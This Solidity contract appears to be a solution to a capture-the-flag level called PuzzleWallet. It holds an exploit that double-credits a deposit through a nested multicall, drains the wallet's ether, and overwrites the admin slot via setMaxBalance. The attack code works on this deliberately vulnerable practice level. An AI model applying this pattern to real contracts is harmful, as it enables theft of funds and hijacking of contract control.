// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/PuzzleWallet.sol";

contract DirectExploit {
    PuzzleWallet public wallet;
    
    constructor(address _wallet) {
        wallet = PuzzleWallet(_wallet);
    }
    
    function exploit() external payable {
        // Create encoded calls
        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSelector(wallet.deposit.selector);
        
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(wallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(wallet.multicall.selector, depositData);
        
        // Double deposit via nested multicall
        wallet.multicall{value: 0.001 ether}(calls);
        
        // Now we should have 0.002 ether balance, withdraw all
        wallet.execute(msg.sender, 0.002 ether, "");
        
        // Set maxBalance to become admin
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
    
    receive() external payable {}
}